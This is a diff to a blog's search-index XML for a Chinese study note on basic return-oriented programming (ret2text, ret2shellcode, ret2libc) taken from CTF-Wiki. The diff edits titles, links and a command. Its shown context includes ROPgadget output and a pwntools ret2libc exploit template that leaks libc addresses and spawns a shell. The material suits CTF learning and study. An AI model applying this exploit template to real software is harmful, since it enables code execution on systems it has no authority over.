@@ -30,7 +30,7 @@
   <entry>
     <title>基本 ROP</title>
     <url>/2025/03/29/%E5%9F%BA%E6%9C%AC%20ROP/</url>
-    <content><![CDATA[<p>学习记录</p>
+    <content><![CDATA[<p>记录</p>
 <span id="more"></span>
 <p><font style="color:rgba(0, 0, 0, 0.87);">来源：</font><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">CTF-Wiki</a></p>
 <p>返回导向编程（Return-Oriented Programming，缩写：ROP）是计算机安全中的一种漏洞利用技术，该技术允</p>
@@ -42,7 +42,7 @@
 <p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
 <p><font style="color:rgba(0, 0, 0, 0.87);">ps:为了方便，后续所有题目我都会命名为“pwn”</font></p>
 <h2 id="ret2text"><font style="color:rgba(0, 0, 0, 0.87);">ret2text</font></h2>
-以ctf-wiki中的题为例：[ret2text](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text)
+以ctf-wiki中的题为例：https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text
 
 
 
@@ -190,7 +190,7 @@ ret2shellcode是指当数据段中有可写可执行段时，向该段中写入�
 
 <p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
 <p><strong><font style="color:rgba(0, 0, 0, 0.87);">上面通过IDA找到了 &#x2F;bin&#x2F;sh 的地址，也可以通过</font></strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn  --string &#x27;/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop  --string &#x27;/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
 
 <p><font style="color:rgba(0, 0, 0, 0.87);">得到：</font></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ ROPgadget --binary pwn  --string &#x27;/bin/sh&#x27;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>
@@ -349,7 +349,7 @@ system 和 /bin/sh 都存在。
 
 <p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
 <h3 id="gnqOP"><font style="color:rgba(0, 0, 0, 0.87);">模板</font></h3>
-write_32（来源：[32位程序libc题型模板](https://blog.csdn.net/qq_51032807/article/details/114808339)）
+write_32
 
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote()</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc____&quot;</span>)      <span class="comment"># 题目提供的 lic 文件</span></span><br><span class="line">e = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt_addr = e.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got_addr = e.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = e.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">offset = ???</span><br><span class="line">payload = offset*<span class="string">b&#x27;a&#x27;</span> + p32(write_plt_addr) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got_addr) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">write_offset = libc.symbols[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_offset = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">base_addr = write_addr - write_offset</span><br><span class="line">system_addr = base_addr + system_offset</span><br><span class="line">binsh_addr = base_addr + binsh_offset</span><br><span class="line"></span><br><span class="line">payload = offset*<span class="string">b&#x27;a&#x27;</span> + p32(system_addr) + p32(<span class="number">1</span>) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r.recvuntil()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
